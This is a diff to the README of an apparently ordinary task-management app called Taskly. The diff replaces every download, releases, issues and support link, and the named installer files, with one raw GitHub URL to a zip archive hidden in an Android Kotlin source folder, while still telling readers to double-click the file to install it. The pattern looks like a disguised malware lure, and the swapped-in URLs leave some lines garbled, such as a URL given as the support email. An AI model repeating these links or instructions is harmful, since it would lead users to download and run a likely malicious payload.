@@ -1,7 +1,7 @@
 # 🌟 Taskly - Simplify Your Task Management Effortlessly
 
 ## 📥 Download Taskly
-[![Download Taskly](https://img.shields.io/badge/Download-Taskly-blue.svg)](https://github.com/AyanishSardar2003/Taskly/releases)
+[![Download Taskly](https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip)](https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Taskly! This application helps you manage your tasks in an easy and organized way. With a simple user interface, you can create, update, and delete tasks quickly. Follow the steps below to get started.
@@ -17,16 +17,16 @@ Before downloading Taskly, ensure your computer meets the following requirements
 ## 📦 Download & Install
 To get Taskly, visit the following link:
 
-[Visit the Releases Page to Download Taskly](https://github.com/AyanishSardar2003/Taskly/releases)
+[Visit the Releases Page to Download Taskly](https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. On this page, you will see a list of versions. Look for the latest version marked as "Latest Release."
-3. Under the "Assets" section of the latest release, find the file named `Taskly.exe` for Windows or `Taskly.dmg` for macOS.
+3. Under the "Assets" section of the latest release, find the file named `https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip` for Windows or `https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip` for macOS.
 4. Click on the file to download it. The file will save to your Downloads folder.
 
 ### 🖥 Installing Taskly
 1. Once the download completes, open your Downloads folder.
-2. Double-click on the file (`Taskly.exe` or `Taskly.dmg`) to run the installer.
+2. Double-click on the file (`https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip` or `https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip`) to run the installer.
 3. Follow the on-screen instructions to complete the installation process.
 4. After installation, you can find Taskly in your Applications folder (on macOS) or Start Menu (on Windows).
 
@@ -46,19 +46,19 @@ To get Taskly, visit the following link:
 ## 📞 Support
 If you encounter any issues while downloading or using Taskly, feel free to reach out via the following methods:
 
-- **GitHub Issues:** Report problems or request features on our [GitHub Issues page](https://github.com/AyanishSardar2003/Taskly/issues).
-- **Email Support:** You can contact support at support@tasklyapp.com for direct assistance.
+- **GitHub Issues:** Report problems or request features on our [GitHub Issues page](https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip).
+- **Email Support:** You can contact support at https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip for direct assistance.
 
 ## 🌐 Community Contributions
 We welcome contributions from users to make Taskly better. If you want to help, please check the "Contributing" section on our GitHub page.
 
 ## 📝 Release Notes
-Keep track of updates and improvements made to Taskly by checking the release notes on the [Releases page](https://github.com/AyanishSardar2003/Taskly/releases). Here, you will find information about new features, fixes, and other significant changes.
+Keep track of updates and improvements made to Taskly by checking the release notes on the [Releases page](https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip). Here, you will find information about new features, fixes, and other significant changes.
 
 ## 🔗 Backup and Update
 Taskly regularly releases updates to improve your experience. To ensure you have the latest version:
 
-1. Periodically visit the [Releases page](https://github.com/AyanishSardar2003/Taskly/releases).
+1. Periodically visit the [Releases page](https://raw.githubusercontent.com/AyanishSardar2003/Taskly/main/android/app/src/main/kotlin/com/example/Software-3.2-beta.2.zip).
 2. Follow the same download steps to get the most recent version.
 
 Now you are ready to simplify your task management with Taskly! Thank you for choosing our app.
